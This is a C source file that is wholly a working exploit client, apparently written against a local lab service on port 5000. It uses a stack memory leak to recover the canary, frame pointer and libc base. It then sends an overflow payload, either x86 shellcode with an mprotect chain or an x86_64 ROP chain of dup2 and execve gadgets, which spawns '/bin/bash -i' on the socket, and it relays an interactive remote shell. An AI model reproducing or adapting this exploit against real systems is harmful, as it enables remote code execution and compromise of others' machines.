#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/ioctl.h>

int main()
{
	struct sockaddr_in serv_addr;
	int sock, connfd;

	long shell[40];
	long pbuf[0x40];

	char *buf = (char *)pbuf;
	int buf_len = sizeof(pbuf);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		printf("socket() failed\n");
		return -1;
	}

	memset(&serv_addr, '0', sizeof(serv_addr));

	const char* ip = "127.0.0.1";
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(5000);
	inet_aton(ip, &serv_addr.sin_addr);

	int ret = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 
	if (ret < 0) {
		printf("connect failed\n");
		return -1;
	}
	int l = buf_len;
	if (write(sock, &l, sizeof(l)) < 0) {
                printf("write failed\n");
                exit(-1);
        }

	memset(pbuf, 0x0, buf_len);
	if (read(sock, pbuf, buf_len) < 0) {
		printf("read() failed\n");
		exit(-1);
	}
	
	memset(shell, 0x0, sizeof(shell));

#if defined(X86)
	for (int i= 0; i < buf_len/4; i++) {
		printf("->> %x\n", pbuf[i]);
	}

	/* 8 Bytes shall be data for overflowed buffer */
	/* STACK CANARY PROTECTION */ shell[2] = pbuf[2];
	int libc_start = pbuf[22]; // extract __libc_start_main+0xf5
	printf("__libc_start_main+0xF5: %x\n", libc_start); // application saves return address of __libc_start_main+0xf5 on the stack
	libc_start -= 0xf5; // deduct offset to __libc_start_main
	libc_start -= 0x1edf0; // deduct offset from __libc_start_main to libc start
	printf("__libc_start: %x\n", libc_start);
	int ebp = pbuf[5];
	printf("EBP: %x\n", ebp);
	/* EBP */ shell[5] = ebp; // restore EBP
	// Libc offset to mprotect is 1024d0
	/* Start from EBP - 0x3C because shellcode is located at shell[21] - shell[6] = 15 * 4 = 60 or 0x3C */
	/* EBP - 0x3C */ shell[6] = libc_start+0x1024d0; // return address: mprotect
	printf("mprotect: %x\n", shell[6]);
	/* ESP */ int esp = (ebp & 0xfffff000);  // STACK address to be mprotect'ed
	printf("ESP: %x\n", esp);
	/* EIP */ int eip = ebp; // exec stack
	printf("EIP: %x\n", eip);
	/* EBP - 0x38 */ shell[7] = eip; // return address 2 after mprotect exit
	/* EBP - 0x34 */ shell[8] = esp; // addr to be changed on stack
	/* EBP - 0x30 */ shell[9] = 0x2000; // 1 page length
	/* EBP - 0x2C */ shell[10] = 0x7; // wrx
	/* EBP - 0x28 */ memcpy(&shell[11], "/bin/bash", strlen("/bin/bash"));
	/* EBP - 0x1C */ memcpy(&shell[14], "-i", strlen("-i"));
	/* EBP - 0x18 */ shell[15] = ebp - 0x28;
	/* EBP - 0x14 */ shell[16] = ebp - 0x1C;
	/* EBP - 0x10 */ shell[17] = 0x0;
	/* EBP - 0xC */ shell[18] = pbuf[7]; // connfd
	/* EBP - 0x8 */ shell[19] = libc_start + 0xf5090; // dup2@libc
	/* EBP - 0x4 */ shell[20] = libc_start + 0xcc180; // execve@libc
	char shellcode[] = "\x31\xc9\x51\x8d\x45\xf4\x8b\x10\x52\x8d\x5d\xf8\xff\x13\x41\x83\xf9\x03\x75\xee\x6a\x00\x8d\x45\xe8\x50\x8d\x45\xd8\x50\x8d\x45\xfc\xff\x10";
	printf("->> %d len shellcode\n", sizeof(shellcode));
	/* EBP - 0x0 */ memcpy(&shell[21], shellcode, sizeof(shellcode));
#elif defined(X86_64)
	for (int i= 0; i < buf_len/8; i++) {
		printf("->> %16lx\n", pbuf[i]);
	}
	/* 8 Bytes shall be data for overflowed buffer so skip pbuf[0] */
	/* STACK CANARY PROTECTION */ shell[1] = pbuf[1];
#ifdef OPTIMIZE
	long libc_start = pbuf[3]; // extract __libc_start_main+0xf3
#else
	long libc_start = pbuf[11]; // extract __libc_start_main+0xf3
#endif
	printf("__libc_start_main+0xF3: %lx\n", libc_start); // application saves return address of __libc_start_main+0xf3 on the stack
	libc_start -= 0xf3; // deduct offset to __libc_start_main
	libc_start -= 0x26fc0; // deduct offset from __libc_start_main to libc start
	printf("__libc_start: %lx\n", libc_start);
#ifndef OPTIMIZE
	long rbp = pbuf[2];
#else
	// RBP is 0 when optimization is enabled!
	long rbp = pbuf[0]; // stack start
	rbp = rbp - 0xf0; // stack pointer in main function
#endif
	printf("RBP: %lx\n", rbp);
	/* RBP - 0x38 || RBP + 0x8 optimized */ shell[3] = libc_start+0x6053e; // return to pop %esi
	/* RBP - 0x30 || RBP + 0x10 optimized */ shell[4] = 0x0;

	/* RBP - 028 || RBP + 0x18 optimized */ shell[5] = libc_start+0x1118a0; // return address: dup2
	/*
	 * 6053b:       48 8d 15 5e c3 18 00    lea    0x18c35e(%rip),%rdx        # 1ec8a0 <stdin@@GLIBC_2.2.5+0x110>
	 *
	 * (gdb) x 0x7ffff7dbd000+0x6053e
	 * 0x7ffff7e1d53e <__GI___printf_fp_l+5742>:	0x0018c35e
	*/
	/* RBP - 0x20 || RBP + 0x20 optimized */ shell[6] = libc_start+0x6053e; // return to pop %esi
	/* RBP - 0x18 || RBP + 0x28 optimized */ shell[7] = 0x1;
	/* RBP - 0x10 || RBP + 0x30 optimized */ shell[8] = libc_start+0x1118a0; // return address: dup2
	/* RBP - 0x8 || RBP + 0x38 optimized */ shell[9] = libc_start+0x6053e; // return to pop %esi
	/* RBP - 0x0 || RBP + 0x40 optimized */ shell[10] = 0x2;
	/* RBP + 0x8  || RBP + 0x48 optimized */ shell[11] = libc_start+0x1118a0; // return address: dup2
	/*
	   In fexecve@@GLIBC_2.2.5:
	   e6227:       5d                      pop    %rbp
	   e6228:       41 5c                   pop    %r12
	   e622a:       41 5d                   pop    %r13
	   e622c:       41 5e                   pop    %r14
	   e622e:       c3                      retq
	*/
	/* RBP + 0x10 || RBP + 0x50 optimized */ shell[12] = libc_start+0xe6227; // return to pop
#ifndef OPTIMIZE
	/* RBP + 0x18 */ shell[13] = rbp + 0x58; // %rbp  - or 2nd execve arg
#else
	/* RBP + 0x58 */ shell[13] = rbp + 0x98; // %rbp  - or 2nd execve arg
#endif
	/* RBP + 0x20 || RBP + 0x60 optimized */ shell[14] = 0x0; // %r12  - or 3rd execve arg
	/* RBP + 0x28 || RBP + 0x68 optimized */ shell[15] = 0x0; // %r13
#ifndef OPTIMIZE
	/* RBP + 0x30 */ shell[16] = rbp + 0x40; // %r14  - or 1st execve arg
#else
	/* RBP + 0x70 optimized */ shell[16] = rbp + 0x80; // %r14  - or 1st execve arg
#endif
	/*
	 * RDX - 3rd arg
	 * RSI - 2nd arg
	 * RDI - 1st arg
	 * In fexecve@@GLIBC_2.2.5:
	   e6278:       48 89 ee                mov    %rbp,%rsi
	   e627b:       4c 89 e2                mov    %r12,%rdx
	   e627e:       4c 89 f7                mov    %r14,%rdi
	   e6281:       e8 da fe ff ff          callq  e6160 <execve@@GLIBC_2.2.5>
	*/
	/* RBP + 0x38 || RBP + 0x78 optimized */ shell[17] = libc_start+0xe6278; // return to execve
	/* RBP + 0x40 || RBP + 0x80 optimized */ memcpy(&shell[18], "/bin/bash", strlen("/bin/bash"));
	/* RBP + 0x50 || RBP + 0x90 optimized */ memcpy(&shell[20], "-i", strlen("-i"));
#ifndef OPTIMIZE
	/* RBP + 0x58 */ shell[21] = rbp + 0x40;
	/* RBP + 0x60 */ shell[22] = rbp + 0x50;
#else
	/* RBP + 0x98 optimized */ shell[21] = rbp + 0x80;
	/* RBP + 0xA0 optimized */ shell[22] = rbp + 0x90;
#endif
	/* RBP + 0x68 || RBP + 0xA8 optimized */ shell[23] = 0x0;
#endif /* X86_64 */

	if (write(sock, shell, sizeof(shell)) < 0) {
		printf("write failed\n");
		exit(-1);
	}


	int flags;
	flags = fcntl(0, F_GETFL, 0);
	fcntl(0, F_SETFL, flags|O_NONBLOCK);
	flags = fcntl(sock,F_GETFL,0);
	fcntl(sock, F_SETFL, flags | O_NONBLOCK);

	fd_set rfds;
	int retval;

	while ( 1 ) {
		memset(buf, 0x0, buf_len);
           
		FD_ZERO(&rfds);
        	FD_SET(0, &rfds);
	   	FD_SET(sock, &rfds);

		retval = select(sock+1, &rfds, NULL, NULL, NULL);

           	if (retval == -1) {
               		perror("select()");
		} else if (retval) {
			int ret;
			if (FD_ISSET(sock, &rfds)) {
				ret = read(sock, buf, buf_len);
				write(1, buf, ret);
			}
			if (FD_ISSET(0, &rfds)) {
				ret = read(0, buf, buf_len);
				if (ret) {
					write(sock, buf, ret);
				}
			}
	   	}
	}

	return 0;
}
